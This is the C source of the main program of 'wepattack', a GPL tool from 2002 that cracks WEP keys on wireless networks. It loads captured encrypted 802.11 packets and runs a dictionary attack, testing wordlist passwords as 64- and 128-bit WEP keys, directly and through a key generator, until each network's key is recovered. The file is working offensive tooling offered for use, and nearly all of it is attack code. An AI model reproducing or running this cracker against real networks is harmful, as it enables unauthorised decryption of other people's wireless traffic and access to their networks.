/********************************************************************************
* File:   		wepattack.c
* Date:   		2002-09-24
* Author: 		Alain Girardet/Dominik Blunk
* Last Modified:	2002-10-24
*
* Description: Read guessed passwords from stdin and applies RC4
* on sniffed encrypted 802.11 DATA packets
*
* This program is free software; you can redistribute it and/or modify it under
* the terms of the GNU General Public License as published by the Free Software
* Foundation; either version 2 of the License, or (at your option) any later
* version. See http://www.fsf.org/copyleft/gpl.txt.
*
* This program is distributed in the hope that it will be useful, but WITHOUT ANY
* WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS FOR A
* PARTICULAR PURPOSE. See the GNU General Public License for more details.
*
********************************************************************************/

#include <time.h>
#include <sys/time.h>
#include <sys/timeb.h>
#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <sys/stat.h>
#include <errno.h>
#include <unistd.h>
#include <zlib.h>
#include <math.h>
#include <signal.h>
#include "wepattack.h"
#include "wepfilter.h"
#include "log.h"
#include "config.h"
#include "modes.h"
#include "misc.h"


wlan_packet_list* current_packet;

// local list with wlan packets
static wlan_packet_list* list_packet_to_crack;

// filepointer to read wordlist from
static FILE * fp;

// for time measuring
struct timeval t_val_start, t_val_end;
struct timezone t_zone;

// statistics
static long word_count = 1;
static double duration = 0;

// default mode (all modes sequential)
static unsigned char use_modes = 0x01;

void clean_up();

//
// load wlan packets from infile
//
void load_packets(char *infile, int network) {

	int network_count = 0;

	// load networks from file
	list_packet_to_crack = get_packets(infile);

	// check if at least one network ist found
	if (list_packet_to_crack == NULL) {
		fprintf(stdout, "\n0 networks loaded...\n");
		exit(1);
	}

	current_packet = list_packet_to_crack;

	// list all available networks
	printf("\n\nFounded BSSID:");
	while (current_packet->next != NULL) {
		network_count++;
		printf("\n%d)  ", network_count);
		print_hex_array(stdout, current_packet->frame.bssid, 6);
		printf("/ Key %d", current_packet->frame.key);
		current_packet = current_packet->next;
	}

	if (network > network_count)
		network = 0;

	// if only one should be attacked, remove the others from the list
	if (network != 0) {
		current_packet = list_packet_to_crack;
		network_count = 1;
		while (network_count != network) {
			network_count++;
			current_packet = current_packet->next;
		}
		// extract one packet from list
		list_packet_to_crack = get_one_packet(list_packet_to_crack,
			current_packet->frame.bssid, current_packet->frame.key);
		network_count = 1;
	}

	printf("\n%d network%s loaded...\n", network_count, network_count>1?"s":"");

}


//
// test if all packets are cracked
//
int all_packets_cracked() {

	int all = 1;

	// set current packet to first packet
	current_packet = list_packet_to_crack;
	// test each packet
	while (current_packet->next != NULL) {
		if (current_packet->cracked != 1)
			all--;
		current_packet = current_packet->next;
	}

	current_packet = list_packet_to_crack;
	return (all<1)?0:1;
}

//
// test key on every packet with requested modes
//
void loop_packets (unsigned char *key){

	while(current_packet->next != NULL) {
		if (!current_packet->cracked) {
			// mode wep 64 bit
			if ((use_modes & 0x07) == 0 || (use_modes & 0x07) == 1) {
				if (mode_wep(key, strlen(key), 5))
					wlan_key_cracked();
			}
			// mode wep 128 bit
			if ((use_modes & 0x07) == 2 || (use_modes & 0x07) == 1) {
				if (mode_wep(key, strlen(key), 13))
					wlan_key_cracked();
			}
			// mode with keygen 64 bit
			if ((use_modes & 0x07) == 4 || (use_modes & 0x07) == 1) {
				if (mode_keygen(key, strlen(key), 5))
					wlan_key_cracked();
			}
			// mode with keygen 128 bit
			if ((use_modes & 0x07) == 6 || (use_modes & 0x07) == 1) {
				if (mode_keygen(key, strlen(key), 13))
					wlan_key_cracked();
			}
		}
		current_packet = current_packet->next;
	}
}

//
// signal handler for ctrl+c
//
void sigint() {

	printf("\nAborting... writing result to '%s'\n", logfile);

	clean_up();
}

//
// print statistic and update logfile with uncracked networks
//
void clean_up() {

	// get end time
	gettimeofday(&t_val_end, &t_zone);

	// calculate elapsed time
	duration = difftime_us(&t_val_start, &t_val_end);
	printf("\ntime: %f sec\twords: %d\n\n", duration, word_count);

	// write ucracked packets to logfile
	log_uncracked(list_packet_to_crack);

	// close word input stream
	fclose(fp);

	delete_list(list_packet_to_crack);

	exit(0);
}

//
// main for wepattack
//
int main(int argc, char * argv[]) {

	FILE*		pf;
	char* 		mode_opt;
	int 		i = 0;
	register int 	op;
	char 		*packet_file = NULL, *word_file = "-";
	unsigned char 	key[20];
	int 		network_arg = 0;

	fp = stdin;

	// install signal handler
	signal(SIGINT, sigint);

	// if no arguments are given, exit
	if(argc <= 1) {
		show_help();
		return 0;
	}

	// process command line options
	// program will terminate, if invalid options are passed
    	while((op = getopt(argc, argv, "n:m:f:w:?")) != -1) {
    		switch(op) {
		case 'n':
			network_arg = atoi(optarg);
			break;
                // arg for packet file to read from
		case 'f':
                        packet_file = optarg;
			pf = fopen(packet_file,"r");
			if (!pf) {
				printf("Dumpfile error: No such file or directory!\n\n");
				return 1;
			}
			fclose(pf);
                        break;
		// arg for modes
                case 'm':
			mode_opt = optarg;
			if (strcmp(mode_opt,"64")== 0)
				use_modes = 0x00;
			else if (strcmp(mode_opt, "128") == 0)
				use_modes = 0x02;
			else if (strcmp(mode_opt, "n64") == 0)
				use_modes = 0x04;
			else if (strcmp(mode_opt, "n128") == 0)
				use_modes = 0x06;
			break;
		// arg for wordfile to read from
		case 'w':
			word_file = optarg;
			fp = fopen(word_file, "r");
			if(!fp) {
				fprintf(stdout,"\nWordfile error: No such file or directory!\n\n");
				return 1;
			}
			break;
		// arg for display helf
		case '?':
                        show_help();
			return 1;
                        break;
		default:
			show_help();
			return 1;
			break;
		}
	}

	// No infile specified
	if(packet_file == NULL) {
		fprintf(stdout,"\nDumpfile error: No dumpfile specified!\n\n");
		show_help();
		return 0;
	}

	// load ieee802.11 encrypted packets
	load_packets(packet_file, network_arg);

	// write header to logfile
	open_log(word_file, packet_file);

	// set current packet to crack to first packet in list
	current_packet = list_packet_to_crack;

	// get start time
	gettimeofday(&t_val_start, &t_zone);


	fprintf(stdout, "\nAccepting wordlist data...\n\n");

	// do cracking until all packets are cracker or no more words left
	while (!all_packets_cracked() && !feof(fp)) {

		// Looks a bit comlicated, but reads almost every file without errors
		while((i < 14)) {
			key[i] = fgetc(fp);
			if(key[i] == '\n') {
				break;
			}
			i++;
		}
		key[i] = '\0';
		i = 0;

		// print out each 10'000 key
		if ((word_count % 10000) == 0)
			printf("key no. %d: %s\n", word_count, key);
		word_count++;

		// main loop to process key in modes on every packet
		loop_packets(key);
	}

	clean_up();

}

